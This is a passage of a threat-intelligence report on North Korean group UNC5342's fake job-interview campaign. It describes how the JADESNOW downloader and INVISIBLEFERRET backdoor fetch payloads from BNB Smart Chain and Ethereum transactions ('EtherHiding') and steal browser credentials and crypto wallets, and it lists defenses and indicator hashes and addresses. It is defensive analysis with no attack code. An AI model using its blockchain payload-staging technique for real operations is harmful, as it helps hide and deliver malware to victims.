potentially gain a foothold in technology companies for future operations.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The campaign is characterized by its elaborate social engineering tactics that mimic legitimate recruitment processes.</span></p>\n<h4><span style=\"vertical-align: baseline;\">1. The Phishing Lure:</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Fake Recruiters and Companies:</strong><span style=\"vertical-align: baseline;\"> The threat actors create convincing but fraudulent profiles on professional networking sites like LinkedIn and job boards. They often impersonate recruiters from well-known tech or cryptocurrency firms.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Fabricated Companies:</strong><span style=\"vertical-align: baseline;\"> In some instances, they have gone as far as setting up fake company websites and social media presences for entities like \"BlockNovas LLC,\" \"Angeloper Agency,\" and \"SoftGlideLLC\" to appear legitimate.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Targeted Outreach:</strong><span style=\"vertical-align: baseline;\"> They aggressively contact potential victims, such as software and web developers, with attractive job offers.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">2. The Interview Process:</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Initial Engagement:</strong><span style=\"vertical-align: baseline;\"> The fake recruiters engage with candidates, often moving the conversation to platforms like Telegram or Discord.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">The Malicious Task:</strong><span style=\"vertical-align: baseline;\"> The core of the attack occurs during a technical assessment phase. Candidates are asked to perform a coding test or review a project, which requires them to download files from repositories like GitHub. These files contain malicious code.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deceptive Tools:</strong><span style=\"vertical-align: baseline;\"> In other variations, candidates are invited to a video interview and are prompted with a fake error message (a technique called ClickFix) that requires them to download a supposed \"fix\" or a specific software to proceed, which is actually the malware.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">3. The Infection Chain:</span></h4>\n<p><span style=\"vertical-align: baseline;\">The campaign employs a multi-stage malware infection process to compromise the victim's system, often affecting Windows, macOS, and Linux systems.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Initial Downloader (</strong><span style=\"vertical-align: baseline;\">e.g.,</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://www.virustotal.com/gui/collection/malware--46392bb3-28c4-5816-a6a5-b18eecea692c\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">JADESNOW</span></a><strong style=\"vertical-align: baseline;\">):</strong><span style=\"vertical-align: baseline;\"> The malicious packages downloaded by the victim are often hosted on the npm (Node Package Manager) registry. These loaders may collect initial system information and download the next stage of malware.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Second-Stage Malware (</strong><span style=\"vertical-align: baseline;\">e.g.,</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://www.virustotal.com/gui/collection/malware--af80edcd-b72d-5c5c-a51d-6d058e5dc671\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BEAVERTAIL</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.virustotal.com/gui/collection/malware--46392bb3-28c4-5816-a6a5-b18eecea692c\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">JADESNOW</span></a><strong style=\"vertical-align: baseline;\">):</strong><span style=\"vertical-align: baseline;\"> The JavaScript-based malware is designed to scan for and exfiltrate sensitive data, with a particular focus on cryptocurrency wallets, browser extension data, and credentials. The addition of </span><span style=\"vertical-align: baseline;\">JADESNOW</span><span style=\"vertical-align: baseline;\"> to the attack chain marks UNC5342’s shift towards EtherHiding to serve up the third-stage backdoor </span><span style=\"vertical-align: baseline;\">INVISIBLEFERRET</span><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Third-Stage Backdoor (</strong><span style=\"vertical-align: baseline;\">e.g.,</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://www.virustotal.com/gui/collection/malware--5fb44265-2abf-5916-9a4c-4e1c54c83946\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">INVISIBLEFERRET</span></a><strong style=\"vertical-align: baseline;\">):</strong><span style=\"vertical-align: baseline;\"> For high-value targets, a more persistent backdoor is deployed. </span><span style=\"vertical-align: baseline;\">INVISIBLEFERRET</span><span style=\"vertical-align: baseline;\">, a Python-based backdoor, provides the attackers remote control over the compromised system, allowing for long-term espionage, data theft, and lateral movement within a network. </span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">JADESNOW</span></h3>\n<p><span style=\"vertical-align: baseline;\">JADESNOW is a JavaScript-based downloader malware family associated with the threat cluster UNC5342. JADESNOW utilizes EtherHiding to fetch, decrypt, and execute malicious payloads from smart contracts on the BNB Smart Chain and Ethereum. The input data stored in the smart contract may be Base64-encoded and XOR-encrypted. The final payload in the JADESNOW infection chain is usually a more persistent backdoor like </span><a href=\"https://www.virustotal.com/gui/collection/malware--a1f65df6-197d-5735-b525-42da2b659b5d\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">INVISIBLEFERRET.JAVASCRIPT</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">The deployment and management of JADESNOW differs from that of similar campaigns that implement EtherHiding, such as CLEARFAKE</span><strong style=\"vertical-align: baseline;\">.</strong><span style=\"vertical-align: baseline;\"> The CLEARFAKE</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">campaign,</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">associated with the threat cluster UNC5142, functions as a malicious JavaScript framework and often masquerades as a Google Chrome browser update pop-up on compromised websites. The primary function of the embedded JavaScript is to download a payload after a user clicks the \"Update Chrome\" button. The second-stage payload is another Base64-encoded JavaScript stored on the BNB Smart Chain. The final payload may be bundled with other files that form part of a legitimate update, like images or configuration files, but the malware itself is usually an infostealer like LUMASTEALER.</span></p>\n<p><span style=\"vertical-align: baseline;\">Figure 1 presents a general overview of the social engineering attack chain. The victim receives a malicious interview question, deceiving the victim into running code that executes the initial JavaScript downloader that interacts with a malicious smart contract and downloads the second-stage payload. The smart contract hosts the JADESNOW downloader that interacts with Ethereum to fetch the third-stage payload, in this case </span><span style=\"vertical-align: baseline;\">INVISIBLEFERRET.JAVASCRIPT.</span><span style=\"vertical-align: baseline;\"> The payload is run in memory and may query Ethereum for an additional</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">credential stealer</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">component. It is unusual to see a threat actor make use of multiple blockchains for EtherHiding activity; this may indicate operational compartmentalization between teams of North Korean cyber operators. Lastly, campaigns frequently leverage EtherHiding's flexible nature to update the infection chain and shift payload delivery locations. In one transaction, the JADESNOW downloader can switch from fetching a payload on Ethereum to fetching it on the BNB Smart Chain. This switch not only complicates analysis but also leverages lower transaction fees offered by alternate networks.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"UNC5342 EtherHiding on BNB Smart Chain and Ethereum\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/dprk-etherhiding-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: UNC5342 EtherHiding on BNB Smart Chain and Ethereum</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Malicious Smart Contracts</span></h3>\n<p><span style=\"vertical-align: baseline;\">BNB Smart Chain and Ethereum are both designed to run decentralized applications (dApps) and smart contracts. A smart contract is code on a blockchain that automatically executes actions when certain conditions or agreements are met, enabling secure, transparent, and automated agreements without intermediaries. Smart contracts are compiled into bytecode and uploaded to the blockchain, making them publicly available to be disassembled for analysis.</span></p>\n<p><span style=\"vertical-align: baseline;\">BNB Smart Chain, like Ethereum, is a decentralized and permissionless blockchain network that supports smart contracts programmed for the Ethereum Virtual Machine (EVM). Although smart contracts offer innovative ways to build decentralized applications, their unchangeable nature is leveraged in EtherHiding to host and serve malicious code in a manner that </span><span style=\"vertical-align: baseline;\">cannot</span><span style=\"vertical-align: baseline;\"> be easily blocked.</span></p>\n<p><span style=\"vertical-align: baseline;\">Making use of Ethereum and BNB Smart Chain for the purpose of EtherHiding is straightforward since it simply involves calling a custom smart contract on the blockchain. UNC5342’s interactions with the blockchain networks are done through centralized API service providers rather than Remote Procedure Call (RPC) endpoints, as seen with CLEARFAKE. When contacted by GTIG, responsible API service providers were quick to take action against this malicious activity; however, several other platforms have remained unresponsive. This indifference and lack of collaboration is a significant concern, as it increases the risk of this technique proliferating among threat actors.</span></p>\n<h3><span style=\"vertical-align: baseline;\">JADESNOW On-Chain Analysis</span></h3>\n<p><span style=\"vertical-align: baseline;\">The initial downloader queries the BNB Smart Chain through a variety of API providers, including </span><a href=\"https://binplorer.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Binplorer</span></a><span style=\"vertical-align: baseline;\">, to read the JADESNOW payload stored at the smart contract at address </span><a href=\"https://bscscan.com/address/0x8eac3198dd72f3e07108c4c7cff43108ad48a71c\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0x8eac3198dd72f3e07108c4c7cff43108ad48a71c</code></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Figure 2 is an example of an API call to read data stored in the smart contract from the transaction history. The transaction details show that the contract has been updated over 20 times within the first four months, with each update costing an average of $1.37 USD in gas fees. The low cost and frequency of these updates illustrate the attacker’s ability to easily change the campaign’s configuration. <span style=\"vertical-align: baseline;\">This smart contract has also been linked to a software supply chain attack that impacted </span><a href=\"https://www.aikido.dev/blog/react-native-aria-attack\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">React Native Aria and GlueStack</span></a><span style=\"vertical-align: baseline;\"> via compromised npm packages in June 2025</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>{\n    timestamp: 1738949853,\n    transactionHash: \"0x5c77567fcf00c317b8156df8e00838105f16fdd4fbbc6cd83d624225397d8856\",\n    tokenInfo: {\n        address: \"0x8eac3198dd72f3e07108c4c7cff43108ad48a71c\",\n        (...)\n        owner: \"0x9bc1355344b54dedf3e44296916ed15653844509\",\n        (...)\n        txsCount: 22,\n        (...)\n    },\n    type: \"issuance\",\n    value: \"1\",\n    priority: 127,\n    address: \"0x9bc1355344b54dedf3e44296916ed15653844509\"\n}</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 2: ABI call for transaction history</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Blockchain explorers like </span><a href=\"https://bscscan.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BscScan</span></a><span style=\"vertical-align: baseline;\"> (for BNB Smart Chain) and </span><a href=\"https://etherscan.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Etherscan</span></a><span style=\"vertical-align: baseline;\"> (for Ethereum) are essential tools for reviewing on-chain information like smart contract code and historic transactions to and from the contract. These transactions may include input data such as a variable </span><code style=\"vertical-align: baseline;\">Name</code><span style=\"vertical-align: baseline;\">, its </span><code style=\"vertical-align: baseline;\">Type</code><span style=\"vertical-align: baseline;\">, and the </span><code style=\"vertical-align: baseline;\">Data</code><span style=\"vertical-align: baseline;\"> stored in that variable. Figure 3 shows on-chain activity at the transaction address </span><a href=\"https://bscscan.com/tx/0x5c77567fcf00c317b8156df8e00838105f16fdd4fbbc6cd83d624225397d8856\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0x5c77567fcf00c317b8156df8e00838105f16fdd4fbbc6cd83d624225397d8856</code></a><span style=\"vertical-align: baseline;\">, where the </span><code style=\"vertical-align: baseline;\">Data</code><span style=\"vertical-align: baseline;\"> field contains a Base64-encoded and XOR-encrypted message. This message decrypts to a heavily obfuscated JavaScript payload that GTIG assesses as the second-stage downloader, JADESNOW.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"UNC5342 on-chain activity\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/dprk-etherhiding-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: UNC5342 on-chain activity</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">When comparing transactions, the launcher-related code remains intact, but the next stage payload is frequently updated with a new obfuscated payload. In this case, the obfuscated payload is run in memory and decrypts an array of strings that combine to form API calls to different transaction hashes on Ethereum. This pivot to a different network is </span><span style=\"vertical-align: baseline;\">notable. The attackers are not using an Ethereum smart contract to store the payload; instead, they perform a </span><code style=\"vertical-align: baseline;\">GET</code><span style=\"vertical-align: baseline;\"> request to query the transaction history of their attacker-controlled address and read the </span><code style=\"vertical-align: baseline;\">calldata</code><span style=\"vertical-align: baseline;\"> stored from transactions made to the well-known “burn” address </span><code style=\"vertical-align: baseline;\">0x00…dEaD</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"On-chain transactions\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/dprk-etherhiding-fig4.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: On-chain transactions</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The final address of these transactions is inconsequential since the malware only reads the data stored in the details of a transaction, effectively using the blockchain transaction</span><span style=\"vertical-align: baseline;\"> as a </span><a href=\"https://attack.mitre.org/techniques/T1102/001/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dead Drop Resolver</span></a><span style=\"vertical-align: baseline;\">.</span><span style=\"vertical-align: baseline;\"> These transactions are generated frequently, showing how easily the campaign can be updated with a simple blockchain transaction, including changing the C2 server.</span></p>\n<p><span style=\"vertical-align: baseline;\">The in-memory payload fetches and evaluates the information stored on-chain by querying Ethereum via different blockchain explorer APIs. Multiple explorers are queried simultaneously (including Blockchair, Blockcypher, and Ethplorer), likely as a fail-safe way to ensure payload retrieval. The use of a free API key, such as </span><code style=\"vertical-align: baseline;\">apiKey=freekey</code><span style=\"vertical-align: baseline;\"> offered by Ethplorer for development, is sufficient for the JADESNOW operation despite strict usage limits.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Payload Analysis</span></h3>\n<p><span style=\"vertical-align: baseline;\">The third stage is the </span><span style=\"vertical-align: baseline;\">INVISIBLEFERRET.JAVASCRIPT</span><span style=\"vertical-align: baseline;\"> payload stored at the Ethereum transaction address </span><a href=\"https://etherscan.io/tx/0x86d1a21fd151e344ccc0778fd018c281db9d40b6ccd4bdd3588cb40fade1a33a\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0x86d1a21fd151e344ccc0778fd018c281db9d40b6ccd4bdd3588cb40fade1a33a</code></a><span style=\"vertical-align: baseline;\">. This payload connects to the C2 server via port 3306, the default port for MySQL. It sends an initial beacon with the victim's hostname, username, operating system, and the directory the backdoor is currently running under. The backdoor proceeds to run in the background, listening for incoming commands to the C2. The command handler is capable of processing arbitrary command execution, executing built-in commands to change the directory, and exfiltrating files, directories, and subdirectories from the victim’s system.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><span style=\"vertical-align: baseline;\">INVISIBLEFERRET.JAVASCRIPT</span><span style=\"vertical-align: baseline;\"> payload may also be split into different components like is done at the transaction address </span><a href=\"https://etherscan.io/tx/0xc2da361c40279a4f2f84448791377652f2bf41f06d18f19941a96c720228cd0f\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0xc2da361c40279a4f2f84448791377652f2bf41f06d18f19941a96c720228cd0f</code></a><span style=\"vertical-align: baseline;\">. The split up JavaScript payload executes the </span><span style=\"vertical-align: baseline;\">INVISIBLEFERRET.JAVASCRIPT</span><span style=\"vertical-align: baseline;\"> backdoor and attempts to install a portable Python interpreter to execute an additional credential stealer component stored at the transaction address </span><a href=\"https://etherscan.io/tx/0xf9d432745ea15dbc00ff319417af3763f72fcf8a4debedbfceeef4246847ce41\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0xf9d432745ea15dbc00ff319417af3763f72fcf8a4debedbfceeef4246847ce41</code></a><span style=\"vertical-align: baseline;\">. This additional credential stealer component targets web browsers like Google Chrome and Microsoft Edge to exfiltrate stored passwords, session cookies, and credit cards. The </span><span style=\"vertical-align: baseline;\">INVISIBLEFERRET.JAVASCRIPT</span><span style=\"vertical-align: baseline;\"> credential stealer component also targets cryptocurrency wallets like MetaMask and Phantom, as well as credentials from other sensitive applications like password managers (e.g., 1Password). The data is compressed into a ZIP archive and uploaded to an attacker-controlled remote server and a private Telegram chat.</span></p></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">The Centralized Dependencies in EtherHiding</span></h3>\n<p><span style=\"vertical-align: baseline;\">Decentralization is a core tenet of blockchain networks and other Web3 technologies. In practice, however, centralized services are often used, which introduces both opportunities and risks. Though blockchains like BNB Smart Chain are immutable and permissionless and the smart contracts deployed onto such blockchains cannot be removed, operations by threat actors using these blockchains are not unstoppable.</span></p>\n<p><span style=\"vertical-align: baseline;\">Neither North Korea’s UNC5342 nor threat actor UNC5142 are interacting directly with BNB Smart Chain when retrieving information from smart contracts; both threat actors are utilizing centralized services, akin to using traditional Web2 services such as web hosting. This affords astute defenders the opportunity to mitigate such threats. These centralized intermediaries represent points of observation and control, where traffic can be monitored and malicious activity can be addressed through blocking, account suspensions, or other methods. In other words, UNC5142 and UNC5342 are using permissioned services to interact with permissionless blockchains.</span></p>\n<p><span style=\"vertical-align: baseline;\">These threat actors exhibit two different approaches to utilizing centralized services for interfacing with blockchain networks:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">An RPC endpoint is used by UNC5142 (CLEARFAKE) in the EtherHiding activity. This allows direct communication with a BNB Smart Chain node hosted by a third party in a manner that is close to a blockchain node’s “native tongue.” </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">An API service hosted by a central entity is used by UNC5342 (DPRK), acting as a layer of abstraction between the threat actor and the blockchain.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Though the difference is nuanced, these intermediary services are positioned to directly impact threat actor operations. Another approach not observed in these operations is to operate a node that integrates fully with the blockchain network. Running a full node is resource-intensive, slow to sync, and creates a significant hardware and network footprint that can be traced, making it a cumbersome and risky tool for cyber operations.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Recommendations</span></h3>\n<p><span style=\"vertical-align: baseline;\">EtherHiding presents new challenges as traditional campaigns have usually been halted by blocking known domains and IPs. Malware authors may leverage the blockchain to perform further malware propagation stages since smart contracts operate autonomously and </span><span style=\"vertical-align: baseline;\">cannot</span><span style=\"vertical-align: baseline;\"> be shut down.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"BscScan warning message\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/dprk-etherhiding-fig5.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: BscScan warning message</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">While security researchers attempt to warn the community by tagging a contract as malicious on official blockchain scanners (like the warning on BscScan in Figure 5), malicious activity can still be performed.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Chrome Enterprise: Centralized Mitigation</span></h3>\n<p><a href=\"https://chromeenterprise.google/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Chrome Enterprise</span></a><span style=\"vertical-align: baseline;\"> can be a powerful tool to prevent the impact of EtherHiding by using its centralized management capabilities to enforce policies that directly disrupt the attack chain. This approach shifts security away from relying on individual user discretion and into the hands of a centralized, automated system.</span></p>\n<p><span style=\"vertical-align: baseline;\">The core strength of </span><span style=\"vertical-align: baseline;\">Chrome Enterprise</span><span style=\"vertical-align: baseline;\"> resides in </span><span style=\"vertical-align: baseline;\">Chrome Browser Cloud Management</span><span style=\"vertical-align: baseline;\">. This platform allows administrators to configure and enforce security policies across all managed browsers in their organization, ensuring consistent protection regardless of the user's location or device.</span></p>\n<p><span style=\"vertical-align: baseline;\">For EtherHiding, this means an administrator can deploy a defense strategy that does not rely on individual users making the right security decisions.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Key Prevention Policies and Strategies</span></h3>\n<p><span style=\"vertical-align: baseline;\">An administrator can use specific policies to break the EtherHiding attack at multiple points:</span></p>\n<h4><span style=\"vertical-align: baseline;\">1. Block Malicious Downloads</span></h4>\n<p><span style=\"vertical-align: baseline;\">This is the most direct and effective way to stop the attack. The final step of an EtherHiding campaign requires the user to download and run a malicious file (e.g., from a fake update prompt). Chrome Enterprise can prevent this entirely.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://support.google.com/chrome/a/answer/7579271\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">DownloadRestrictions</strong></a><strong style=\"vertical-align: baseline;\"> Policy:</strong><span style=\"vertical-align: baseline;\"> An admin can configure this policy to block downloads of dangerous file types. By setting this policy to block file types like </span><code style=\"vertical-align: baseline;\">.exe</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">.msi</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">.bat</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">.dll</code><span style=\"vertical-align: baseline;\">, the malicious payload can not be saved to the user's computer, effectively stopping the attack.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">2. Automate and Manage Browser Updates</span></h4>\n<p><span style=\"vertical-align: baseline;\">EtherHiding heavily relies on social engineering, most notably by using a pop-up that tells the user \"Your Chrome is out of date.\" In a managed enterprise environment, this should be an immediate red flag.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://support.google.com/chrome/a/answer/9838774\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Managed Updates</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Administrators use Chrome Enterprise to control and automate browser updates. Updates are pushed silently and automatically in the background.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">User Training:</strong><span style=\"vertical-align: baseline;\"> Because updates are managed, employees can be trained with a simple, powerful message: </span><strong style=\"vertical-align: baseline;\">\"</strong><span style=\"vertical-align: baseline;\">You will never be asked to manually update Chrome.</span><strong style=\"vertical-align: baseline;\">\" </strong><span style=\"vertical-align: baseline;\">Any prompt to do so is considered a scam and thus undermines the primary social engineering tactic.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">3. Control Web Access and Scripts</span></h4>\n<p><span style=\"vertical-align: baseline;\">While attackers constantly change their infrastructure, policies can still reduce the initial attack surface.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://support.google.com/chrome/a/answer/7532419\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">URLBlocklist</strong></a><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">Policy</span><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Admins can block access to known malicious websites, domains, or even the URLs of blockchain nodes if they are identified by threat intelligence.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://support.google.com/chrome/answer/13844634#zippy=%2Chow-safe-browsing-works\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Safe Browsing</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Policies can enforce Google's Safe Browsing in its most enhanced mode, which uses real-time threat intelligence to warn users about phishing sites and malicious downloads.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Acknowledgements</span></h3>\n<p><span style=\"vertical-align: baseline;\">This analysis would not have been possible without the assistance from across Google Threat Intelligence Group, including the Koreas Mission, FLARE, and Advanced Practices.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Indicators of Compromise</span></h3></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<thead>\n<tr>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">Type</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">Indicator</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">Context</strong></p>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SHA256 Hash (ZIP Archive)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">970307708071c01d32ef542a49099571852846a980d6e8eb164d2578147a1628</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ZIP archive containing the initial downloader, in this case JADESNOW.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SHA256 Hash (Initial JavaScript Downloader)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">01fd153bfb4be440dd46cea7bebe8eb61b1897596523f6f6d1a507a708b17cc7</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">JADESNOW sample to launch infection chain.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BSC Address (Smart Contract)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">0x8eac3198dd72f3e07108c4c7cff43108ad48a71c</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BNB Smart Chain contract used by UNC5342 to host the second-stage JADESNOW payload.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BSC Address 